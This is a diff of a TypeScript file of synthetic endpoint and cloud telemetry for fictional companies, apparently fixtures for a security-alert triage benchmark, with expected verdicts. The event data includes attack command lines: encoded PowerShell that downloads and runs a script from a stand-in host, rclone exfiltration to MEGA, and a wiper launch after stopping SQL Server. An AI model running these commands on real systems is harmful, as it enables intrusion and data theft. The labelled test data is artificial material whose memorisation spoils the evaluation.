@@ -565,7 +565,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
       "crowdstrike.event_simpleName": "ProcessRollup2",
       "threat.technique.id": "T1567", "threat.technique.subtechnique.id": "T1567.002", "crowdstrike.Tactic": "Exfiltration",
       "process.command_line": "rclone copy /Users/t.chen/Downloads mega:backup --progress",
-      "network.bytes_out": "6710886400", "destination.domain": "g.api.mega.co.nz",
+      "destination.domain": "g.api.mega.co.nz",
       "action_result": "detect_only" }
   },
 
@@ -718,8 +718,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     description: "s.amir pulled Docker image node:20-alpine on SRV-PROD-001",
     process: { name: "docker", pid: 6100, parent_name: "zsh", parent_pid: 5001,
                user: "s.amir", cmdline: "docker pull node:20-alpine" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "action_result": "allowed",
-           "container.image.name": "node:20-alpine", "container.runtime": "docker" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "action_result": "allowed" }
   },
   {
     id: "rs_docker_002", ts: "2026-05-10T11:40:00.000Z",
@@ -729,8 +728,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     description: "r.cohen ran docker-compose up for local dev stack on LAP-012",
     process: { name: "docker-compose", pid: 6210, parent_name: "zsh", parent_pid: 5001,
                user: "r.cohen", cmdline: "docker-compose -f docker-compose.dev.yml up -d" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "action_result": "allowed",
-           "container.services": "api,postgres,redis", "container.runtime": "docker" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "action_result": "allowed" }
   },
 
   // ── Google Workspace - email & calendar (normal) ──────────────────────────
@@ -918,7 +916,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     src_ip: "192.168.10.45",
     description: "n.smits launched Epiq.EMR.exe on WS-MED-045",
     process: { name: "Epiq.EMR.exe", pid: 3320, parent_name: "explorer.exe", parent_pid: 2100, user: "n.smits", integrity: "medium" },
-    raw: { "s1.eventType": "Process Creation", "process.code_signature.exists": true, "process.code_signature.trusted": true, "file.vendor": "Epiq Systems", "action_result": "allowed" }
+    raw: { "s1.eventType": "Process Creation", "process.code_signature.exists": true, "process.code_signature.trusted": true, "process.code_signature.subject_name": "Epiq Systems", "action_result": "allowed" }
   },
   {
     id: "mc_s1_002", ts: "2026-05-10T07:08:00.000Z",
@@ -949,7 +947,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     mitre_technique: "T1566.001",
     process: { name: "cmd.exe", pid: 7741, parent_name: "WINWORD.EXE", parent_pid: 6610, user: "dr.vandijk", cmdline: "cmd.exe /c whoami /all > C:\\Users\\DOCVDIJK\\AppData\\Local\\Temp\\~tmp88A.txt", integrity: "high" },
     file: { path: "C:\\Users\\dr.vandijk\\AppData\\Local\\Temp\\MedConf2026_Schedule.docm", sha256: "d3c6766e5479a506de5991edf1cc62d35f999dda86baa1b57f7c541e746990f3" },
-    raw: { "s1.eventType": "Indicators", "s1.indicator.name": "OFFICE_MACRO_CMD_SPAWN", "action_result": "allowed", "policy.name": "Clinical-Detect-Only", "process.code_signature.exists": false, "process.code_signature.trusted": false }
+    raw: { "s1.eventType": "Indicators", "s1.indicator.name": "OFFICE_MACRO_CMD_SPAWN", "action_result": "allowed", "process.code_signature.exists": false, "process.code_signature.trusted": false }
   },
   {
     // ⚠ ATTACK STEP 2 - PowerShell with encoded command (not blocked)
@@ -960,7 +958,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     description: "A hidden PowerShell command ran on WS-MED-022, launched from the earlier suspicious cmd.exe process",
     mitre_technique: "T1059.001", expected_verdict: "tp", is_detection: true,
     process: { name: "powershell.exe", pid: 7799, parent_name: "cmd.exe", parent_pid: 7741, user: "dr.vandijk", cmdline: "powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQBtAGUAZAB1AHAAZABhAHQAZQAuAG4AZQB0AC8AeAAuAHAAcwAxACcAKQA=", integrity: "high" },
-    raw: { "s1.eventType": "Indicators", "s1.indicator.name": "POWERSHELL_ENCODED_COMMAND", "action_result": "allowed", "policy.name": "Clinical-Detect-Only", "mitre.tactic": "Execution" }
+    raw: { "s1.eventType": "Indicators", "s1.indicator.name": "POWERSHELL_ENCODED_COMMAND", "action_result": "allowed", "threat.tactic.name": "Execution" }
   },
   {
     id: "mc_s1_006", ts: "2026-05-10T09:15:00.000Z",
@@ -971,7 +969,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     expected_verdict: "tp", is_detection: true,
     description: "Trojan.GenericKD detected on WS-NURS-033",
     file: { path: "C:\\Users\\r.bakker\\AppData\\Temp\\update.exe", sha256: "6204651fac7f02eb1baba261cd2b4852d21eaf94f00bfcee0bd76c599e32c1e9" },
-    raw: { "s1.eventType": "Threats", "s1.threat.threatName": "Trojan.GenericKD", "s1.threat.confidenceLevel": "malicious", "s1.threat.classification": "Trojan", "s1.threat.mitigationStatus": "mitigated", "threat.name": "Trojan.GenericKD", "action_result": "process_killed", "quarantine.status": "quarantined", "process.killed": "true" }
+    raw: { "s1.eventType": "Threats", "s1.threat.threatName": "Trojan.GenericKD", "s1.threat.confidenceLevel": "malicious", "s1.threat.classification": "Trojan", "s1.threat.mitigationStatus": "mitigated", "threat.name": "Trojan.GenericKD", "action_result": "process_killed", "quarantine.status": "quarantined" }
   },
   {
     // ⚠ ATTACK STEP 3 - LSASS memory read (credential dumping - detected, not blocked)
@@ -983,7 +981,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     description: "powershell.exe (PID 7799) on WS-MED-022 opened a handle to lsass.exe memory",
     mitre_technique: "T1003.001",
     process: { name: "powershell.exe", pid: 7799, parent_name: "cmd.exe", parent_pid: 7741, user: "dr.vandijk", cmdline: "powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand ...", integrity: "high" },
-    raw: { "s1.eventType": "Indicators", "s1.indicator.name": "LSASS_MEMORY_READ", "s1.tgtProcName": "lsass.exe", "s1.granted_access": "0x1FFFFF", "s1.mitigation_status": "not_mitigated", "s1.detection.classification": "Suspicious Activity", "action_result": "allowed", "policy.name": "Clinical-Detect-Only" }
+    raw: { "s1.eventType": "Indicators", "s1.indicator.name": "LSASS_MEMORY_READ", "s1.tgtProcName": "lsass.exe", "s1.granted_access": "0x1FFFFF", "s1.mitigation_status": "not_mitigated", "s1.detection.classification": "Suspicious Activity", "action_result": "allowed" }
   },
 
   // ── Post-compromise: lateral movement from WS-MED-022 toward EMR server ──────
@@ -1076,10 +1074,9 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
       "process.name":                      "powershell.exe",
       "process.pid":                       "7799",
       "user.name":                         "MEDCORE\\dr.vandijk",
-      "network.destination":               "192.168.10.200",
-      "network.port":                      "445",
-      "action_result":                     "allowed",
-      "policy.name":                       "Clinical-Detect-Only"
+      "destination.ip":                    "192.168.10.200",
+      "destination.port":                  "445",
+      "action_result":                     "allowed"
     }
   },
 
@@ -1108,7 +1105,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     description: "OUTLOOK.EXE dropped MedConf_Invoice.zip on WS-NURS-044 Desktop",
     file: { path: "C:\\Users\\m.verhoeven\\Desktop\\MedConf_Invoice.zip", sha256: "ae5949f8d2f7e02942e7e7a528edea083f876cffa946879983a6f67331f69443" },
     mitre_technique: "T1566.001",
-    raw: { "s1.eventType": "File Creation", "s1.indicator.name": "SUSPICIOUS_EMAIL_ATTACHMENT", "action_result": "allowed", "file.extension": ".zip", "parent.process": "OUTLOOK.EXE" }
+    raw: { "s1.eventType": "File Creation", "s1.indicator.name": "SUSPICIOUS_EMAIL_ATTACHMENT", "action_result": "allowed", "file.extension": ".zip", "process.parent.name": "OUTLOOK.EXE" }
   },
 
   // ════════════════════════════════════════════════════════════════
@@ -1559,7 +1556,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     raw: {
       "s1.eventType": "Process Creation", "s1.threat.confidenceLevel": "trusted",
       "s1.file_bytes_copied": "50465865728", "s1.destination": "\\\\NAS-BACKUP-01\\ehr-archive",
-      "schedule.cron": "0 1 * * *", "action_result": "allowed" }
+      "action_result": "allowed" }
   },
   {
     id: "mc_copy_fp_01", ts: "2026-05-10T11:30:00.000Z",
@@ -1574,8 +1571,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
                user: "dr.smit", cmdline: "ExportTool.exe --query oncology_2020_2025 --anonymise --out C:\\Research\\export.csv" },
     raw: {
       "s1.eventType": "Process Creation", "s1.threat.confidenceLevel": "trusted",
-      "ehr.records_exported": "3120", "ehr.anonymised": "true",
-      "dpo.approval_ref": "MED-DPO-2026-08", "action_result": "allowed" }
+      "action_result": "allowed" }
   },
   {
     id: "mc_copy_atk_01", ts: "2026-05-10T19:14:00.000Z",
@@ -1589,9 +1585,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     raw: {
       "s1.eventType": "Device Control",
       "s1.dlp_policy": "GDPR-Patient-PII", "s1.dlp_violation": "true",
-      "usb.serial": "4A9C-0012", "usb.vendor": "SanDisk",
-      "file.name": "patient_records_export.csv", "file.size_bytes": "62914560",
-      "dlp.records_count": "8400", "dlp.data_classification": "PHI - HL7 FHIR",
+      "file.name": "patient_records_export.csv", "file.size": "62914560",
       "action_result": "blocked" }
   },
   {
@@ -1721,10 +1715,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     raw: {
       "s1.eventType": "IP Connect", "action_result": "allowed",
       "process.name": "SecuraPACSViewer.exe", "process.command_line": "\"C:\\Program Files\\SecuraPACS\\SecuraPACSViewer.exe\" --dicom", "user.name": "MEDCORE\\phoekstra",
-      "pacs.action": "image.retrieve", "pacs.modality": "CT",
-      "pacs.study_uid": "1.2.840.10008.5.1.4.1.1.2.47821",
-      "pacs.patient_id": "P-18847", "pacs.images_fetched": "84",
-      "network.destination": "SRV-MEDCORE-PACS01", "network.port": "11112" }
+      "destination.domain": "SRV-MEDCORE-PACS01", "destination.port": "11112" }
   },
   {
     id: "mc_pacs_002", ts: "2026-05-10T09:48:00.000Z",
@@ -1736,9 +1727,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     raw: {
       "s1.eventType": "IP Connect", "action_result": "allowed",
       "process.name": "SecuraPACSViewer.exe", "process.command_line": "\"C:\\Program Files\\SecuraPACS\\SecuraPACSViewer.exe\" --dicom", "user.name": "MEDCORE\\drvandijk",
-      "pacs.action": "image.query", "pacs.modality": "US",
-      "pacs.study_uid": "1.2.840.10008.5.1.4.1.1.6.1.19203",
-      "pacs.patient_id": "P-19203", "network.destination": "SRV-MEDCORE-PACS01" }
+      "destination.domain": "SRV-MEDCORE-PACS01" }
   },
 
   // ── O365 / Teams - clinical collaboration events ──────────────────────────
@@ -1790,8 +1779,8 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
                user: "SYSTEM", cmdline: "wuauclt.exe /updatenow" },
     raw: {
       "s1.eventType": "Process Creation",
-      "process.code_signature.exists": true, "process.code_signature.trusted": true, "windows.update.kb_ids": "KB5034441,KB5034122,KB5035942",
-      "windows.update.reboot_required": "false", "action_result": "allowed" }
+      "process.code_signature.exists": true, "process.code_signature.trusted": true,
+      "action_result": "allowed" }
   },
   {
     id: "mc_patch_002", ts: "2026-05-10T02:30:00.000Z",
@@ -2464,7 +2453,7 @@ const QUANTUMBANK_EVENTS: TelemetryEvent[] = [
     expected_verdict: "tp", is_detection: true,
     description: "CrowdStrike raised a memory-based detection inside svchost.exe on WKS-QB-012 and killed the process",
     file: { path: "memory://svchost.exe", sha256: "32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77" },
-    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "threat.name": "CobaltStrike.beacon.reflective", "action_result": "process_killed", "quarantine.status": "quarantined", "process.killed": "true", "crowdstrike.SeverityName": "CRITICAL", "policy.name": "Banking-Prevent" }
+    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "threat.name": "CobaltStrike.beacon.reflective", "action_result": "process_killed", "quarantine.status": "quarantined", "process.killed": "true", "crowdstrike.SeverityName": "CRITICAL" }
   },
   // ── AWS GovCloud ──────────────────────────────────────────────────────────
   {
@@ -3127,7 +3116,7 @@ const MEDCORE_ATTACKS: TelemetryEvent[] = [
     mitre_technique: "T1059.001",
     process: { name: "powershell.exe", pid: 4422, parent_name: "cmd.exe", parent_pid: 4421, user: "dr.peters", cmdline: "powershell.exe -WindowStyle Hidden -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQBtAGUAZAB1AHAAZABhAHQAZQAuAG4AZQB0AC8AbQAuAHAAcwAxACcAKQA=", hash: { sha256: "f10052e10c319749ccd6aead272df3e831e4d4224a32ac589e1a577db38e2b70" } },
     file: { path: "C:\\Users\\dr.peters\\AppData\\Local\\Temp\\Melding_2026_05.docm", sha256: "f10052e10c319749ccd6aead272df3e831e4d4224a32ac589e1a577db38e2b70" },
-    raw: { "s1.indicator.name": "OFFICE_MACRO_CMD_SPAWN", "policy.name": "Clinical-Detect-Only", "action_result": "allowed" }
+    raw: { "s1.indicator.name": "OFFICE_MACRO_CMD_SPAWN", "action_result": "allowed" }
   },
   {
     // DNS is SIEM-normalized (ECS dns.* schema), so it is attributed to the DNS feed,
@@ -3166,7 +3155,7 @@ const MEDCORE_ATTACKS: TelemetryEvent[] = [
     // The copy is Explorer writing to the removable drive: S1 records the writing process.
     process: { name: "explorer.exe", pid: 5124, path: "C:\\Windows\\explorer.exe", cmdline: "C:\\Windows\\Explorer.EXE", user: "n.smits", parent_name: "userinit.exe" },
     file: { path: "F:\\PatientRecords\\Clinical_0094.pdf", name: "Clinical_0094.pdf" },
-    raw: { "s1.eventType": "File Creation", "file.destination": "F:\\", "usb.vendor": "SanDisk", "usb.serial": "7A2F-CC01", "action_result": "allowed" }
+    raw: { "s1.eventType": "File Creation", "action_result": "allowed" }
   },
   {
     id: "mc_b3", ts: "2026-05-10T11:30:00.000Z", source: "cloud_azure", event_type: "cloud_api_call",
@@ -3213,7 +3202,7 @@ const MEDCORE_ATTACKS: TelemetryEvent[] = [
     description: "robocopy ran as p.hoekstra on SRV-MEDCORE-PACS01, copying the 2026 DICOM share (22 GB) to C:\\Temp\\backup",
     mitre_technique: "T1039",
     process: { name: "robocopy.exe", pid: 5512, parent_name: "cmd.exe", parent_pid: 5511, user: "p.hoekstra", cmdline: "robocopy \\\\SRV-MEDCORE-PACS01\\DICOM\\2026 C:\\Temp\\backup /E /Z" },
-    raw: { "s1.indicator.name": "SUSPICIOUS_BULK_COPY", "action_result": "allowed", "robocopy.files_copied": "8841" }
+    raw: { "s1.indicator.name": "SUSPICIOUS_BULK_COPY", "action_result": "allowed" }
   },
   // ── Chain D - Cisco VPN brute force → clinical account compromise ──────────
   {
@@ -3258,7 +3247,7 @@ const MEDCORE_ATTACKS: TelemetryEvent[] = [
     raw: { "s1.eventType": "IP Connect",
            "s1.indicator.name": "REMOTE_DESKTOP_SESSION_FROM_VPN_RANGE",
            "source.ip": "198.51.100.167", "destination.port": "3389",
-           "network.destination": "WS-NURS-022", "network.protocol": "tcp",
+           "network.protocol": "tcp",
            "action_result": "allowed" }
   },
 ];
@@ -3468,7 +3457,7 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
     description: "Installing the npm package rocketstack-utils 3.2.1 ran an automatic post-install script on LAP-003",
     mitre_technique: "T1195.001",
     process: { name: "node", pid: 9310, parent_name: "npm", parent_pid: 9300, user: "s.amir", cmdline: "node /tmp/.npm-install/postinstall.js", hash: { sha256: "85427add0401af37258ec324e4fbb48b13042888b2f3d9cbd0f6ce63e85fac2c" } },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "node /tmp/.npm-install/postinstall.js", "crowdstrike.FileName": "node", "crowdstrike.FilePath": "/usr/local/bin/", "crowdstrike.ParentBaseFileName": "npm", "crowdstrike.UserName": "s.amir", "crowdstrike.SHA256HashData": "85427add0401af37258ec324e4fbb48b13042888b2f3d9cbd0f6ce63e85fac2c", "npm.package": "rocketstack-utils@3.2.1", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "node /tmp/.npm-install/postinstall.js", "crowdstrike.FileName": "node", "crowdstrike.FilePath": "/usr/local/bin/", "crowdstrike.ParentBaseFileName": "npm", "crowdstrike.UserName": "s.amir", "crowdstrike.SHA256HashData": "85427add0401af37258ec324e4fbb48b13042888b2f3d9cbd0f6ce63e85fac2c", "action_result": "allowed" }
   },
   {
     // DNS is SIEM-normalized (ECS dns.* schema), attributed to the DNS feed rather than
@@ -3707,7 +3696,7 @@ const GLOBALLOGIS_ATTACKS: TelemetryEvent[] = [
                path: "C:\\Windows\\Temp\\svchostd.exe", cmdline: "C:\\Windows\\Temp\\svchostd.exe",
                hash: { sha256: "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa" } },
     file: { path: "C:\\Windows\\Temp\\svchostd.exe", sha256: "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa" },
-    raw: { "sophos.event_type": "Process", "sophos.detection_name": "Mal/Wiper-A", "action_result": "process_killed", "process.killed": "true", "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa", "process.parent.name": "cmd.exe", "process.parent.command_line": "cmd.exe /c net stop MSSQLSERVER /y && C:\\Windows\\Temp\\svchostd.exe" }
+    raw: { "sophos.event_type": "Process", "sophos.detection_name": "Mal/Wiper-A", "action_result": "process_killed", "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa", "process.parent.name": "cmd.exe", "process.parent.command_line": "cmd.exe /c net stop MSSQLSERVER /y && C:\\Windows\\Temp\\svchostd.exe" }
   },
   // ── Chain D - SSH brute force → Linux server root compromise ──────────────
   {
